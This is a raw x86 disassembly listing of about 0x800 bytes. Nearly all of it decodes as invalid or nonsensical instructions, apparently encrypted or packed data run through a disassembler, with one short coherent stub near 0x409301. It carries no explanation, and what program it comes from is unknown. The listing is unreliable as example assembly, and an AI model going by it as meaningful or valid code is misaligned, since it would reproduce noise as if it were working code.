  409118:	sub    bl,BYTE PTR [edx+ebp*2-0x1a0bde0b]
  40911f:	cmp    DWORD PTR [edx-0x27],0x576a8516
  409126:	iret   
  409127:	std    
  409128:	cmp    BYTE PTR [edx-0x109076],0x6b
  40912f:	loopne 0x4090d1
  409131:	in     al,dx
  409132:	xor    eax,0xea59455f
  409137:	mov    dl,0x8f
  409139:	jmp    0x1bb2:0x415c2758
  409140:	mov    edx,0xb2e25810
  409145:	dec    esi
  409146:	dec    eax
  409147:	push   ecx
  409148:	idiv   BYTE PTR [eax]
  40914a:	ins    DWORD PTR es:[edi],dx
  40914b:	push   ecx
  40914c:	aaa    
  40914d:	hlt    
  40914e:	cmc    
  40914f:	and    ebp,DWORD PTR [ecx+0x7adf2442]
  409155:	shl    BYTE PTR [ebx-0x35],cl
  409158:	xchg   BYTE PTR [ecx-0x4a80d970],cl
  40915e:	pop    ecx
  40915f:	(bad)  
  409160:	leave  
  409161:	mov    bl,0xfa
  409163:	bnd jmp 0x40915c
  409166:	ret    
  409167:	mov    cl,0xa5
  409169:	mov    WORD PTR [ecx+0x59],gs
  40916c:	les    edx,FWORD PTR [edx-0x54]
  40916f:	mov    dl,0xf4
  409171:	into   
  409172:	call   0x43824a72
  409177:	mov    ebx,0xdb4e5301
  40917c:	sbb    edx,DWORD PTR [edx-0x741dd2dd]
  409182:	push   edx
  409183:	add    al,0xf4
  409185:	or     BYTE PTR [esi],0xa7
  409188:	adc    eax,0xefaba445
  40918d:	push   es
  40918e:	lods   eax,DWORD PTR ds:[esi]
  40918f:	jne    0x40912e
  409191:	pop    edi
  409192:	jg     0x40914f
  409194:	dec    eax
  409195:	sub    BYTE PTR [ebx+0x2a24537b],al
  40919b:	jo     0x409169
  40919d:	sbb    eax,0x97e0da91
  4091a2:	repz leave 
  4091a4:	xchg   edi,eax
  4091a5:	jno    0x409158
  4091a7:	xlat   BYTE PTR ds:[ebx]
  4091a8:	jmp    0xe297c7e
  4091ad:	jl     0x409163
  4091af:	pusha  
  4091b0:	icebp  
  4091b1:	fs ja  0x4091c1
  4091b4:	push   edi
  4091b5:	mov    al,ds:0x71b6ac38
  4091ba:	ror    dh,cl
  4091bc:	push   edi
  4091bd:	jmp    0x7faa:0xe31ae65f
  4091c4:	and    al,0x45
  4091c6:	mov    DWORD PTR [eax+0x37],0xc6d9ee8f
  4091cd:	icebp  
  4091ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091cf:	add    bl,cl
  4091d1:	outs   dx,DWORD PTR ds:[esi]
  4091d2:	(bad)  
  4091d3:	clc    
  4091d4:	fstp   DWORD PTR [eax]
  4091d6:	sbb    al,0x6
  4091d8:	dec    ecx
  4091d9:	mov    al,0x22
  4091db:	push   edi
  4091dc:	xchg   ecx,eax
  4091dd:	adc    bh,BYTE PTR [eax]
  4091df:	mov    bl,0xe5
  4091e1:	jmp    0x40921b
  4091e3:	lods   al,BYTE PTR ds:[esi]
  4091e4:	adc    al,0x2c
  4091e6:	xor    BYTE PTR [eax-0x23],dl
  4091e9:	repz jle 0x4091a2
  4091ec:	ds push ecx
  4091ee:	push   ss
  4091ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091f0:	aaa    
  4091f1:	xchg   edx,eax
  4091f2:	jno    0x4091bc
  4091f4:	out    dx,eax
  4091f5:	fsub   QWORD PTR [ebp-0x35]
  4091f8:	xchg   ecx,eax
  4091f9:	icebp  
  4091fa:	pandn  mm2,QWORD PTR [edx]
  4091fd:	mov    dl,0xa0
  4091ff:	add    ah,BYTE PTR [eax-0xafbb2a1]
  409205:	mov    ebx,0x9a423885
  40920a:	mov    dh,0x96
  40920c:	test   al,0xd8
  40920e:	loope  0x409277
  409210:	(bad)  
  409211:	inc    eax
  409212:	mov    esp,DWORD PTR [ebx+edx*2-0x17b84f17]
  409219:	push   es
  40921a:	adc    edi,DWORD PTR [ebp-0x3b816c02]
  409220:	dec    edx
  409221:	pop    eax
  409222:	out    dx,al
  409223:	fisttp WORD PTR [ecx-0x5c1e08c]
  409229:	jmp    0x4091b2
  40922b:	inc    ecx
  40922c:	jae    0x409290
  40922e:	inc    edi
  40922f:	mov    esi,0xa8bed4af
  409234:	mov    cs,WORD PTR [edi]
  409236:	ss inc ebp
  409238:	add    eax,0x917355c1
  40923d:	rcl    DWORD PTR [edi],0x1e
  409240:	in     eax,dx
  409241:	leave  
  409242:	loope  0x4092ae
  409244:	pop    ebp
  409245:	pop    ebp
  409246:	imul   ecx,DWORD PTR [esi],0x361759cb
  40924c:	cld    
  40924d:	jp     0x40920e
  40924f:	mov    al,ds:0xafb0f86
  409254:	mov    al,ds:0xaf2cb83d
  409259:	nop
  40925a:	xchg   esi,eax
  40925b:	sub    eax,0x91455b74
  409260:	out    dx,eax
  409261:	shl    BYTE PTR [esi-0x61f4c38f],1
  409267:	pop    esp
  409268:	pop    ds
  409269:	cwde   
  40926a:	lods   eax,DWORD PTR ds:[esi]
  40926b:	rol    DWORD PTR [ecx],cl
  40926d:	add    BYTE PTR [ecx-0x187aa31],cl
  409273:	xchg   ecx,eax
  409274:	pop    ss
  409275:	stc    
  409276:	jb     0x40924a
  409278:	jecxz  0x409275
  40927a:	imul   edi,DWORD PTR [edi+0x40494ad6],0x77
  409281:	pop    esi
  409282:	inc    edi
  409283:	ret    
  409284:	sub    BYTE PTR [ebx],al
  409286:	in     eax,dx
  409287:	std    
  409288:	xor    eax,DWORD PTR [ebx-0x3de1cbd6]
  40928e:	(bad)  
  40928f:	retf   
  409290:	jae    0x409290
  409292:	mov    ch,0x43
  409294:	sub    edx,ebx
  409296:	add    DWORD PTR [edx+0x14694449],0x62
  40929d:	int    0xae
  40929f:	sbb    esi,edi
  4092a1:	adc    eax,0xcdbc49af
  4092a6:	addr16 icebp 
  4092a8:	iret   
  4092a9:	push   ebx
  4092aa:	add    al,0x89
  4092ac:	cld    
  4092ad:	xchg   ecx,eax
  4092ae:	mov    ah,0xfd
  4092b0:	sbb    eax,DWORD PTR [ebx-0x46]
  4092b3:	push   ss
  4092b4:	das    
  4092b5:	pop    ecx
  4092b6:	fwait
  4092b7:	imul   DWORD PTR [ebp-0x4cbb4c66]
  4092bd:	jne    0x409269
  4092bf:	fstp   QWORD PTR [ebx]
  4092c1:	or     eax,0x3247df39
  4092c6:	and    DWORD PTR [edi-0x62],eax
  4092c9:	in     al,dx
  4092ca:	jmp    0x789ea93f
  4092cf:	adc    al,0x1c
  4092d1:	push   esp
  4092d2:	lods   al,BYTE PTR ds:[esi]
  4092d3:	adc    edx,edi
  4092d5:	mov    eax,ds:0xf80f7d24
  4092da:	(bad)  [eax+0x213fd4f4]
  4092e0:	mov    ecx,0x76bf6071
  4092e5:	pause  
  4092e7:	dec    ebx
  4092e8:	cmp    esp,ebx
  4092ea:	add    ch,BYTE PTR [edx]
  4092ec:	repnz fucomp st(4)
  4092ef:	into   
  4092f0:	xchg   BYTE PTR [ebp+ebx*2+0x3110d2dd],bh
  4092f7:	inc    esi
  4092f8:	sahf   
  4092f9:	dec    ebp
  4092fa:	mov    edx,0x7de73fad
  4092ff:	ror    DWORD PTR [edi],1
  409301:	push   DWORD PTR [eax]
  409303:	lea    eax,ds:0x41b260
  409309:	push   DWORD PTR [eax]
  40930b:	lea    eax,ds:0x41b344
  409311:	push   DWORD PTR [eax]
  409313:	xchg   ebx,edx
  409315:	inc    ebx
  409316:	inc    ebx
  409317:	sub    ebx,0x3
  40931a:	push   ebx
  40931b:	pop    eax
  40931c:	jmp    0x409669
  409321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409322:	jnp    0x409329
  409324:	or     DWORD PTR [ecx+0x52b3b211],esp
  40932a:	lahf   
  40932b:	jo     0x4092ae
  40932d:	sbb    BYTE PTR [ecx+0x25],0x37
  409331:	daa    
  409332:	loop   0x4093a4
  409334:	jo     0x409356
  409336:	jge    0x4093a8
  409338:	jo     0x40931a
  40933a:	jp     0x4092ea
  40933c:	cmp    al,BYTE PTR [edx]
  40933e:	rol    DWORD PTR [ebp-0x1fc02d03],0xbb
  409345:	ror    BYTE PTR [edi-0x603170cb],cl
  40934b:	inc    ebp
  40934c:	mov    edi,0x313b9c42
  409351:	xchg   ebp,eax
  409352:	mov    DWORD PTR [edx+0x7e],esp
  409355:	jg     0x409310
  409357:	shl    BYTE PTR [ebp+0x2131ae77],1
  40935d:	pop    ecx
  40935e:	push   esp
  40935f:	sbb    BYTE PTR cs:[ebp+0x56],0xf5
  409364:	daa    
  409365:	outs   dx,BYTE PTR ds:[esi]
  409366:	lahf   
  409367:	add    al,0x80
  409369:	fist   DWORD PTR [bx+si]
  40936c:	xchg   edi,eax
  40936d:	mov    ecx,0xc6edb11e
  409372:	add    eax,0x553b1b99
  409377:	mov    cl,0x82
  409379:	xchg   DWORD PTR [edx-0x4d10cbe0],ecx
  40937f:	ins    BYTE PTR es:[edi],dx
  409380:	pop    edi
  409381:	or     al,0x62
  409383:	adc    al,0x9a
  409385:	pop    ecx
  409386:	sbb    dh,BYTE PTR [ebp-0x7f562e5d]
  40938c:	add    DWORD PTR [eax+0x38],edx
  40938f:	sub    dh,BYTE PTR [edx-0x2a53cf64]
  409395:	das    
  409396:	and    bh,BYTE PTR [ecx-0x61232f3f]
  40939c:	pusha  
  40939d:	xchg   esi,eax
  40939e:	mov    al,0x7f
  4093a0:	stos   BYTE PTR es:[edi],al
  4093a1:	add    al,BYTE PTR [esp+ebx*2-0x52d58acf]
  4093a8:	and    BYTE PTR [edi],0xaa
  4093ab:	in     eax,0x7b
  4093ad:	aaa    
  4093ae:	pop    ss
  4093af:	pop    es
  4093b0:	fist   WORD PTR [esi-0x1858460c]
  4093b6:	adc    cl,BYTE PTR [esi-0x34]
  4093b9:	test   ebx,ebx
  4093bb:	iret   
  4093bc:	or     DWORD PTR [edx],esi
  4093be:	pop    esp
  4093bf:	inc    esi
  4093c0:	dec    ebp
  4093c1:	add    BYTE PTR fs:[ebx+0x17],bh
  4093c5:	inc    ebx
  4093c6:	xor    BYTE PTR [ecx+0x5dd3dfef],bl
  4093cc:	adc    al,0x7e
  4093ce:	cs mov dl,0x60
  4093d1:	sbb    ebp,ebx
  4093d3:	ret    0x42d6
  4093d6:	rcl    DWORD PTR ds:0xec7cde06,0x13
  4093dd:	(bad)  
  4093de:	fiadd  WORD PTR [eax+0x23]
  4093e1:	jmp    0xc89a907
  4093e6:	test   al,0xa9
  4093e8:	xchg   ebx,eax
  4093e9:	dec    edi
  4093ea:	cs leave 
  4093ec:	addr16 out 0x36,eax
  4093ef:	xchg   ecx,eax
  4093f0:	xor    eax,0xad91adf2
  4093f5:	adc    ebp,DWORD PTR [ecx+0x74]
  4093f8:	inc    edi
  4093f9:	push   ebx
  4093fa:	adc    DWORD PTR [eax],0xffffffeb
  4093fd:	scas   eax,DWORD PTR es:[edi]
  4093fe:	and    ebp,DWORD PTR [ebp+0x1b350aee]
  409404:	xlat   BYTE PTR ds:[ebx]
  409405:	jmp    DWORD PTR [ebp+eiz*8+0x71d75e29]
  40940c:	sti    
  40940d:	adc    eax,0xe4ef96e2
  409412:	(bad)  
  409413:	jge    0x409488
  409415:	pushf  
  409416:	sbb    al,0x27
  409418:	mov    dh,0x3a
  40941a:	mov    esi,0xedafaf00
  40941f:	add    esi,ebx
  409421:	push   es
  409422:	mov    ecx,0x67f6bdf1
  409427:	out    0xed,eax
  409429:	out    0xc3,al
  40942b:	(bad)  
  40942c:	cmp    al,0x12
  40942e:	gs add eax,0xe6b70d0c
  409434:	add    DWORD PTR [edi],0xb70171b5
  40943a:	in     al,0xb8
  40943c:	idiv   BYTE PTR [ecx+ebp*1-0x6824e707]
  409443:	lock sbb eax,DWORD PTR [edi+0x9f27fb6]
  40944a:	daa    
  40944b:	ret    
  40944c:	(bad)  
  40944d:	int3   
  40944e:	or     BYTE PTR [edi],bl
  409450:	lds    esp,FWORD PTR [eax-0x5a]
  409453:	pop    ebx
  409454:	push   ebp
  409455:	dec    edx
  409456:	mov    ch,0xeb
  409458:	dec    ebx
  409459:	call   0xa5fd058a
  40945e:	dec    edx
  40945f:	hlt    
  409460:	adc    eax,0x51ef5685
  409465:	inc    eax
  409466:	mov    dh,0xd4
  409468:	or     ebx,DWORD PTR [ecx]
  40946a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40946b:	mov    cs,ebp
  40946d:	int    0x48
  40946f:	out    dx,eax
  409470:	xchg   edx,eax
  409471:	inc    ebx
  409472:	repnz rcr DWORD PTR [edx],1
  409475:	and    eax,0xe80dc854
  40947a:	add    eax,0xd5bbd013
  40947f:	setbe  BYTE PTR [edx+0x383de133]
  409486:	and    ebp,DWORD PTR [esp+ebx*4]
  409489:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40948a:	cld    
  40948b:	(bad)  
  40948c:	bound  esi,QWORD PTR [edx+ecx*8-0x2c1d5f68]
  409493:	mov    fs,WORD PTR [ebp-0x310f355f]
  409499:	jbe    0x40942c
  40949b:	outs   dx,BYTE PTR ds:[esi]
  40949c:	xor    edi,DWORD PTR [edi]
  40949e:	push   0x58d2a8e8
  4094a3:	cwde   
  4094a4:	(bad)  
  4094a5:	mov    dl,BYTE PTR [ebp+0x4e]
  4094a8:	jmp    0xf084:0x4ff9749f
  4094af:	add    al,BYTE PTR ds:0x477060b0
  4094b5:	push   ebp
  4094b6:	xlat   BYTE PTR ds:[ebx]
  4094b7:	shl    cl,1
  4094b9:	xchg   DWORD PTR fs:[ebp-0x2b],ebx
  4094bd:	push   edx
  4094be:	xor    al,0xf8
  4094c0:	aam    0x12
  4094c2:	dec    esp
  4094c3:	jmp    0x409457
  4094c5:	and    eax,0xf3894ddf
  4094ca:	inc    edx
  4094cb:	aaa    
  4094cc:	and    bl,BYTE PTR [ebx-0x6ec93e93]
  4094d2:	iret   
  4094d3:	or     DWORD PTR [ecx+ebx*2],edx
  4094d6:	adc    al,0x6c
  4094d8:	jbe    0x40946d
  4094da:	outs   dx,BYTE PTR ds:[esi]
  4094db:	hlt    
  4094dc:	add    ebx,esp
  4094de:	mov    dh,ch
  4094e0:	mov    bl,0xdb
  4094e2:	push   cs
  4094e3:	in     al,dx
  4094e4:	adc    edi,DWORD PTR [eax-0x55]
  4094e7:	repnz push es
  4094e9:	test   ch,bh
  4094eb:	add    BYTE PTR [ebp+esi*8-0x55ebb029],bh
  4094f2:	call   FWORD PTR [edx-0x74]
  4094f5:	dec    esp
  4094f6:	xchg   ebx,eax
  4094f7:	mov    ds:0x1cc26168,al
  4094fc:	push   ecx
  4094fd:	in     eax,0x41
  4094ff:	pop    ebx
  409500:	cld    
  409501:	into   
  409502:	sbb    DWORD PTR [ebx-0x3ed0036c],esi
  409508:	sbb    esi,DWORD PTR [ebx-0x25]
  40950b:	aam    0x3b
  40950d:	xchg   edi,eax
  40950e:	aad    0x29
  409510:	adc    eax,0x282980e9
  409515:	call   0xc8e:0x3026dc64
  40951c:	pop    es
  40951d:	jbe    0x409572
  40951f:	mov    edi,0x3d74c2cf
  409524:	mov    WORD PTR [ebx],fs
  409526:	(bad)  
  409527:	shl    BYTE PTR [esi],0x78
  40952a:	test   esi,0xf4d8b466
  409530:	ss mov dl,0x7a
  409533:	lds    ebx,FWORD PTR [ecx+0x1110a65b]
  409539:	push   edx
  40953a:	dec    ebp
  40953b:	je     0x59a69d97
  409541:	ja     0x4094c5
  409543:	pushf  
  409544:	add    eax,0x79d55ee9
  409549:	pop    esp
  40954a:	xchg   ecx,eax
  40954b:	sbb    bh,al
  40954d:	sub    cl,cl
  40954f:	xchg   edi,eax
  409550:	pop    edi
  409551:	add    ch,BYTE PTR [eax]
  409553:	addr16 stc 
  409555:	sub    al,0xd
  409557:	fldcw  WORD PTR [edi]
  409559:	mov    al,ds:0x1219bcb1
  40955e:	mov    al,0x6d
  409560:	mov    eax,ds:0x7f43e297
  409565:	sub    bh,BYTE PTR [ebx+0x17]
  409568:	shl    DWORD PTR [edi-0x61],0x16
  40956c:	cmp    al,0x50
  40956e:	nop
  40956f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409570:	mov    eax,ds:0xef9784a
  409575:	inc    ebp
  409576:	scas   eax,DWORD PTR es:[edi]
  409577:	jb     0x409544
  409579:	or     al,0xfb
  40957b:	int3   
  40957c:	mov    bp,0xb656
  409580:	pop    ecx
  409581:	xor    DWORD PTR [ecx],ebp
  409583:	and    dh,dl
  409585:	imul   DWORD PTR [ebp-0xb45cbd3]
  40958b:	mov    ecx,0xc0199fde
  409590:	pop    ss
  409591:	dec    ebp
  409592:	inc    edi
  409593:	ss push 0xd46c6857
  409599:	in     eax,dx
  40959a:	fdivrp st(6),st
  40959c:	nop
  40959d:	and    DWORD PTR [ecx-0x32054d1d],edi
  4095a3:	adc    bl,BYTE PTR [esi+0xf]
  4095a6:	inc    eax
  4095a7:	mov    al,0xc8
  4095a9:	imul   ch
  4095ab:	ror    BYTE PTR es:[esi],1
  4095ae:	jg     0x4095db
  4095b0:	cmp    al,0x97
  4095b2:	pop    esp
  4095b3:	scas   eax,DWORD PTR es:[edi]
  4095b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095b5:	je     0x4095f6
  4095b7:	xor    BYTE PTR [eax],dh
  4095b9:	push   ss
  4095ba:	push   0x48
  4095bc:	add    al,0xd
  4095be:	pop    eax
  4095bf:	jo     0x409626
  4095c1:	push   ecx
  4095c2:	mov    dl,0x1a
  4095c4:	or     dh,ah
  4095c6:	dec    ebp
  4095c7:	mov    ds:0x12b692d8,eax
  4095cc:	fdivrp st(6),st
  4095ce:	imul   esp,DWORD PTR [eax+eiz*8],0x587c52a2
  4095d5:	cli    
  4095d6:	aad    0xd9
  4095d8:	or     ebx,DWORD PTR [ebx]
  4095da:	mov    esp,0x2c15625d
  4095df:	imul   ebp,DWORD PTR [edx],0xd51b1d94
  4095e5:	mov    BYTE PTR [esp+esi*8-0x5b],al
  4095e9:	das    
  4095ea:	sbb    BYTE PTR [ebp-0x7b995b21],bh
  4095f0:	push   esi
  4095f1:	cmp    ebp,0xffffffea
  4095f4:	fstp   DWORD PTR [edi+0x5d1323d2]
  4095fa:	lea    ebx,[eax+0x24ecabc7]
  409600:	imul   ecx,DWORD PTR [edx+0x63286c5c],0x707ead7f
  40960a:	mov    ebp,0xa9330101
  40960f:	mov    BYTE PTR [esi+eax*4-0x24],bh
  409613:	(bad)  
  409614:	ror    esi,cl
  409616:	push   0x20
  409618:	mov    eax,ds:0x674bae4b
  40961d:	mov    ds:0xfaa477b8,eax
  409622:	push   cs
  409623:	and    al,0x0
  409625:	mov    dh,0x0
  409627:	inc    edi
  409628:	enter  0x6021,0x4b
  40962c:	jl     0x40965e
  40962e:	inc    edi
  40962f:	out    dx,eax
  409630:	imul   BYTE PTR [ebp-0x18]
  409633:	xor    DWORD PTR [edx+0x28],0xffffff9a
  409637:	fld    TBYTE PTR [ebp+0x600be9ba]
  40963d:	mov    DWORD PTR [ebp+0x4a2984b4],ebx
  409643:	mov    ds:0xd667876c,eax
  409648:	js     0x409615
  40964a:	cmp    dl,BYTE PTR [esi]
  40964c:	fist   DWORD PTR [ecx+0x51]
  40964f:	enter  0xfbfa,0xd2
  409653:	xchg   BYTE PTR [ecx+0x35],ah
  409656:	mov    esp,0x398fbf2d
  40965b:	pop    esi
  40965c:	scas   eax,DWORD PTR es:[edi]
  40965d:	out    0x5a,al
  40965f:	fwait
  409660:	imul   esi,DWORD PTR [ebp+eax*2+0x5cafa8aa],0xffffffe1
  409668:	sub    edi,edi
  40966a:	push   eax
  40966b:	add    DWORD PTR [ebx+0xd8be045],ecx
  409671:	and    al,0xb2
  409673:	inc    ecx
  409674:	add    cl,ch
  409676:	dec    eax
  409677:	add    eax,DWORD PTR [eax]
  409679:	add    bh,ch
  40967b:	mov    ebx,0xd169d149
  409680:	ja     0x4096e3
  409682:	add    BYTE PTR [edi+0x44],bh
  409685:	xchg   DWORD PTR [edx],ebx
  409687:	or     dl,BYTE PTR [esi+0x70efd76c]
  40968d:	jo     0x4096af
  40968f:	jge    0x409701
  409691:	jo     0x4096af
  409693:	sub    al,0xb7
  409695:	push   edi
  409696:	jmp    0x103e:0x5b83bcc6
  40969d:	push   edi
  40969e:	shl    BYTE PTR [ebp-0x3],0x17
  4096a2:	in     eax,0x8b
  4096a4:	or     DWORD PTR [edi-0x65],esi
  4096a7:	dec    esi
  4096a8:	adc    ah,cl
  4096aa:	adc    al,0xa9
  4096ac:	mov    bh,BYTE PTR ds:0xf3e4b07c
  4096b2:	xor    al,0x81
  4096b4:	out    dx,al
  4096b5:	or     al,0xcc
  4096b7:	nop
  4096b8:	popf   
  4096b9:	ins    BYTE PTR es:[edi],dx
  4096ba:	or     al,0x58
  4096bc:	out    dx,eax
  4096bd:	cli    
  4096be:	ds aas 
  4096c0:	ret    
  4096c1:	cmc    
  4096c2:	int3   
  4096c3:	sub    bh,dh
  4096c5:	outs   dx,DWORD PTR ds:[esi]
  4096c6:	rol    ebx,1
  4096c8:	adc    ah,BYTE PTR [esi-0x285b1530]
  4096ce:	jecxz  0x409665
  4096d0:	xchg   edx,eax
  4096d1:	lds    ebx,FWORD PTR [ecx+0x5e]
  4096d4:	call   0x225a:0x877a6f4a
  4096db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096dc:	test   BYTE PTR [ebx+0x4fa03d2d],cl
  4096e2:	inc    ebp
  4096e3:	ss js  0x409747
  4096e6:	test   DWORD PTR [ebp-0x35f2eff],esi
  4096ec:	inc    ebx
  4096ed:	popa   
  4096ee:	iret   
  4096ef:	pop    es
  4096f0:	aaa    
  4096f1:	rcr    DWORD PTR [ecx+ebx*4-0x92401e1],0x2f
  4096f9:	ret    
  4096fa:	mov    al,ds:0xe7f95d02
  4096ff:	aas    
  409700:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409701:	fs inc eax
  409703:	retf   0x9c6d
  409706:	ins    BYTE PTR es:[edi],dx
  409707:	add    esi,DWORD PTR [ecx-0x65]
  40970a:	std    
  40970b:	adc    edi,ecx
  40970d:	add    al,0x8e
  40970f:	icebp  
  409710:	jb     0x4096bb
  409712:	retf   
  409713:	sub    bh,BYTE PTR [esi+0x3d]
  409716:	jmp    0xaa2f4341
  40971b:	les    ebx,FWORD PTR [ecx-0x4e]
  40971e:	les    ecx,FWORD PTR [ebx+0x76]
  409721:	mov    ch,0x4b
  409723:	or     eax,DWORD PTR [edi+0x67]
  409726:	data16 int3 
  409728:	cli    
  409729:	out    0x7,al
  40972b:	mov    eax,0x7538c965
  409730:	push   esi
  409731:	cmp    eax,0x77912da1
  409736:	push   0x13
  409738:	dec    edx
  409739:	add    al,BYTE PTR [ebx]
  40973b:	in     eax,dx
  40973c:	mov    edx,0xfb0d23c1
  409741:	and    DWORD PTR [ebx+edx*2+0x2391d1e6],esi
  409748:	pop    edi
  409749:	jge    0x4097a6
  40974b:	(bad)  
  40974c:	je     0x4097bf
  40974e:	aas    
  40974f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409750:	retf   
  409751:	inc    edx
  409752:	stos   DWORD PTR es:[edi],eax
  409753:	in     al,0x80
  409755:	jbe    0x409709
  409757:	cmp    eax,0x1461b582
  40975c:	mov    esp,DWORD PTR [ebp-0x7193d929]
  409762:	test   al,0xc2
  409764:	(bad)  [ebx+0x19c58fbb]
  40976a:	jp     0x4097a4
  40976c:	bound  ecx,QWORD PTR [ebp-0x4f]
  40976f:	add    BYTE PTR [ebp+0x6a],ch
  409772:	pop    eax
  409773:	test   BYTE PTR [edx+0x3d],al
  409776:	mov    esi,0xd8cbd10e
  40977b:	jg     0x4097de
  40977d:	nop
  40977e:	ret    
  40977f:	(bad)  
  409780:	mul    ebp
  409782:	or     DWORD PTR [ebx-0x4b],esi
  409785:	push   ecx
  409786:	sar    DWORD PTR [ecx+0x26cbdec],1
  40978c:	call   0xdbf8053c
  409791:	(bad)  
  409792:	pop    ss
  409793:	ins    BYTE PTR es:[edi],dx
  409794:	sar    esi,cl
  409796:	loop   0x409776
  409798:	cmc    
  409799:	xor    dh,BYTE PTR [ecx]
  40979b:	adc    al,0xc1
  40979d:	mov    DWORD PTR [edi+0x1a57559f],ebp
  4097a3:	jp     0x409824
  4097a5:	add    ecx,DWORD PTR [ecx-0xd5c3887]
  4097ab:	mov    bl,0xdb
  4097ad:	pop    es
  4097ae:	cwde   
  4097af:	enter  0x45ec,0xbe
  4097b3:	mov    ch,0xed
  4097b5:	sbb    BYTE PTR [edx],al
  4097b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097b8:	lds    edx,FWORD PTR ds:0x8234201b
  4097be:	jl     0x4097d9
  4097c0:	ror    cl,cl
  4097c2:	mov    BYTE PTR ds:0xdd00d1c3,ah
  4097c8:	add    eax,0x55b6ca45
  4097cd:	imul   eax,DWORD PTR [ecx-0x2e],0x5acf2f1e
  4097d4:	sub    al,0xe6
  4097d6:	jp     0x4097ac
  4097d8:	mov    eax,ds:0xafc0344d
  4097dd:	xlat   BYTE PTR ds:[ebx]
  4097de:	xor    eax,0x89acaac7
  4097e3:	mov    esi,0x54dda97
  4097e8:	pushf  
  4097e9:	xchg   ebp,eax
  4097ea:	mov    eax,ds:0x4b4a2abf
  4097ef:	pop    ebx
  4097f0:	xor    al,0x75
  4097f2:	dec    esi
  4097f3:	mov    ds:0x6b5f2b63,al
  4097f8:	push   ebp
  4097f9:	cmp    DWORD PTR [ecx-0x51d495ed],esp
  4097ff:	xchg   ecx,eax
  409800:	dec    esp
  409801:	rol    BYTE PTR [edx-0x33c734ba],cl
  409807:	stos   DWORD PTR es:[edi],eax
  409808:	pop    es
  409809:	iret   
  40980a:	sbb    DWORD PTR [eax+0x570ada7d],ecx
  409810:	xchg   BYTE PTR [esi+ebp*1],dl
  409813:	cmp    ebx,eax
  409815:	sbb    BYTE PTR [edi+0x4b],dh
  409818:	mov    ah,0xab
  40981a:	dec    ebx
  40981b:	repz adc BYTE PTR [ebp+0x14],bl
  40981f:	and    edi,0xffffff91
  409822:	outs   dx,DWORD PTR ds:[esi]
  409823:	shl    edx,cl
  409825:	sub    al,0xfc
  409827:	mov    al,0x1f
  409829:	ds ins DWORD PTR es:[edi],dx
  40982b:	cmp    ebp,DWORD PTR [edi+eax*1-0x67]
  40982f:	cmp    ebx,DWORD PTR [ebx+ecx*4+0x12]
  409833:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409834:	mov    ss,WORD PTR [ebx+0x3f]
  409837:	mov    al,0x87
  409839:	xchg   BYTE PTR [ebp-0x23],al
  40983c:	(bad)  
  40983d:	xchg   ecx,eax
  40983e:	rcl    DWORD PTR [ebx-0x306b182e],cl
  409844:	or     DWORD PTR [edi-0x4e],0x2aefe59
  40984b:	dec    BYTE PTR [edx+0x6586af29]
  409851:	and    esp,ecx
  409853:	idiv   DWORD PTR [ebp+eiz*2+0x45]
  409857:	popf   
  409858:	sbb    BYTE PTR [esi+edi*2+0x57757fc3],cl
  40985f:	dec    esp
  409860:	push   ecx
  409861:	adc    al,0x24
  409863:	mov    ecx,0x937526d9
  409868:	or     al,0x22
  40986a:	mov    esp,0x1bdbd9a0
  40986f:	(bad)  
  409871:	repz (bad) 
  409873:	cmp    eax,0x5e2d84e8
  409878:	clc    
  409879:	mov    ebp,0xf6abf572
  40987e:	add    eax,ebp
  409880:	int3   
  409881:	mov    dl,0xb3
  409883:	(bad)  
  409884:	cdq    
  409885:	sahf   
  409886:	out    0x9f,al
  409888:	int    0x4
  40988a:	outs   dx,BYTE PTR ds:[esi]
  40988b:	add    ecx,ecx
  40988d:	popf   
  40988e:	push   esp
  40988f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409890:	pop    esi
  409891:	repnz frstor [esi-0x52]
  409895:	xlat   BYTE PTR ds:[ebx]
  409896:	movaps xmm5,XMMWORD PTR [edi+0x66]
  40989a:	xor    dl,BYTE PTR [edx+0x60]
  40989d:	jno    0x409886
  40989f:	pop    ecx
  4098a0:	or     al,0x4b
  4098a2:	icebp  
  4098a3:	cld    
  4098a4:	test   eax,0xd4988953
  4098a9:	stc    
  4098aa:	and    al,0x48
  4098ac:	mov    dl,0xb7
  4098ae:	ins    DWORD PTR es:[edi],dx
  4098af:	ja     0x40988b
  4098b1:	out    dx,al
  4098b2:	lahf   
  4098b3:	call   0x1985:0x52a40450
  4098ba:	das    
  4098bb:	push   ebp
  4098bc:	(bad)  
  4098bd:	cdq    
  4098be:	aam    0xe8
  4098c0:	dec    ebp
  4098c1:	ins    DWORD PTR es:[edi],dx
  4098c2:	repnz rcr BYTE PTR [ebx+esi*2],1
  4098c6:	aaa    
  4098c7:	jb     0x40986a
  4098c9:	pusha  
  4098ca:	ins    DWORD PTR es:[edi],dx
  4098cb:	hlt    
  4098cc:	fcomp  QWORD PTR [ebx+0x807034d]
  4098d2:	test   al,0xb5
  4098d4:	je     0x4098ba
  4098d6:	adc    al,0x57
  4098d8:	aam    0x6c
  4098da:	mov    ch,0x78
  4098dc:	xchg   BYTE PTR [ebx-0x53],dl
  4098df:	push   edi
  4098e0:	add    al,0x19
  4098e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098e3:	push   0xae1e3c52
  4098e8:	push   es
  4098e9:	pop    esp
  4098ea:	lea    edx,[edi-0x593a5669]
  4098f0:	out    0xd1,eax
  4098f2:	cmp    cl,bl
  4098f4:	or     DWORD PTR [ebx+0x36630469],esp
  4098fa:	pop    edi
  4098fb:	inc    esi
  4098fc:	dec    esi
  4098fd:	daa    
  4098fe:	push   esp
  4098ff:	out    dx,eax
  409900:	aam    0x2a
